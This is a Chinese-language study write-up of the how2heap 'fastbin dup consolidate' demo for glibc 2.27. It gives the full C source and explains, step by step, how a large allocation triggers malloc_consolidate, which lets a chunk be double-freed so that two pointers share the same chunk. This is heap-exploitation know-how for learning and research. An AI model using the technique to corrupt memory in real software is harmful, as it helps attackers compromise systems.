---
title: fastbin dup consolidate
description: 
published: true
date: 2022-10-04T13:18:36.274Z
tags: pwn, 堆利用
editor: markdown
dateCreated: 2022-10-04T13:18:36.274Z
---

# 源码
```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

void main() {
	// reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8
	puts("This is a powerful technique that bypasses the double free check in tcachebin.");
	printf("Fill up the tcache list to force the fastbin usage...\n");

	void *ptr[7];

	for(int i = 0; i < 7; i++)
		ptr[i] = malloc(0x40);
	for(int i = 0; i < 7; i++)
		free(ptr[i]);

	void* p1 = calloc(1,0x40);

	printf("Allocate another chunk of the same size p1=%p \n", p1);
  printf("Freeing p1 will add this chunk to the fastbin list...\n\n");
  free(p1);

  void* p3 = malloc(0x400);
	printf("Allocating a tcache-sized chunk (p3=%p)\n", p3);
	printf("will trigger the malloc_consolidate and merge\n");
	printf("the fastbin chunks into the top chunk, thus\n");
	printf("p1 and p3 are now pointing to the same chunk !\n\n");

	assert(p1 == p3);

  printf("Triggering the double free vulnerability!\n\n");
	free(p1);

	void *p4 = malloc(0x400);

	assert(p4 == p3);

	printf("The double free added the chunk referenced by p1 \n");
	printf("to the tcache thus the next similar-size malloc will\n");
	printf("point to p3: p3=%p, p4=%p\n\n",p3, p4);
}
```

# 解析
## 填充tcache
源码中10到15行如下所示
```c
void *ptr[7];

for(int i = 0; i < 7; i++)
  ptr[i] = malloc(0x40);
for(int i = 0; i < 7; i++)
  free(ptr[i]);
```
正如源码中第8行所说的，上面的代码主要是为了填充tcache，从而快速使用fastbin。

## fastbin中放入chunk
源码17到21行如下所示
```c
void* p1 = calloc(1,0x40);

printf("Allocate another chunk of the same size p1=%p \n", p1);
printf("Freeing p1 will add this chunk to the fastbin list...\n\n");
free(p1);
```
这里利用`calloc()`申请一个相同大小但非tcache中的chunk，然后将它释放，从而成功将其放入fastbin中。

## 触发malloc consolidate
源码23至27行如下所示
```c
void* p3 = malloc(0x400);
printf("Allocating a tcache-sized chunk (p3=%p)\n", p3);
printf("will trigger the malloc_consolidate and merge\n");
printf("the fastbin chunks into the top chunk, thus\n");
printf("p1 and p3 are now pointing to the same chunk !\n\n");
```
申请一个0x400的堆块，并将用户指针赋给p3。这里源码中的`tcache-sized chunk`没有理解作者的意思，我的理解是申请一个large bin大小的chunk从而触发`malloc consolidate`。这时`p1`和`p3`会指向相同的chunk，咋一看很神奇，我们来调试一下。

在23行下断点，查看fastbin和堆块，如下图所示：

![h2p_2.27_fbdupconsolidate1.png](/how2heap/glibc2.27/fastbin_dup_consolidate/h2p_2.27_fbdupconsolidate1.png){.align-center}
![h2p_2.27_fbdupconsolidate2.png](/how2heap/glibc2.27/fastbin_dup_consolidate/h2p_2.27_fbdupconsolidate2.png){.align-center}

可以看到当23行执行之前，之前释放的`p1`被放入了fastbin中，接下来步过一次，看看23执行后有什么变化，如下图所示：

![h2p_2.27_fbdupconsolidate3.png](/how2heap/glibc2.27/fastbin_dup_consolidate/h2p_2.27_fbdupconsolidate3.png){.align-center}

可以看到fastbin中没有chunk，而且原本地址上的chunk的Size从0x51变为了0x411。这是因为当我们执行`malloc(0x400)`时触发了`malloc consolidate`，fastbin会被清空，原本被释放的`p1`与top chunk合并，然后再从top chunk分割出一个用户空间为0x400大小的chunk，这一过程中堆块的地址不会发生变化，所以`p1`和`p3`就会指向同一个堆块。

## 触发double free
源码31到40行如下所示：
```c
printf("Triggering the double free vulnerability!\n\n");
free(p1);

void *p4 = malloc(0x400);

assert(p4 == p3);

printf("The double free added the chunk referenced by p1 \n");
printf("to the tcache thus the next similar-size malloc will\n");
printf("point to p3: p3=%p, p4=%p\n\n",p3, p4);
```
这时我们可以再次释放`p1`，虽然释放的是`p1`，但是实际上释放的是之前分配的`p3`，如果当我们再次申请相同大小的chunk时，被释放的`p3`再次被调用，chunk地址被赋给了`p4`，这时`p3`和`p4`也指向相同的chunk。

## 运行结果
![h2p_2.27_fbdupconsolidate4.png](/how2heap/glibc2.27/fastbin_dup_consolidate/h2p_2.27_fbdupconsolidate4.png)

# 总结
申请large bin大小的chunk触发`malloc consolidate`，使fastbin中的chunk的指针与新申请的chunk的指针指向同一chunk，然后就可以二次释放fastbin中的chunk，紧接着也可以再次申请已分配的chunk。
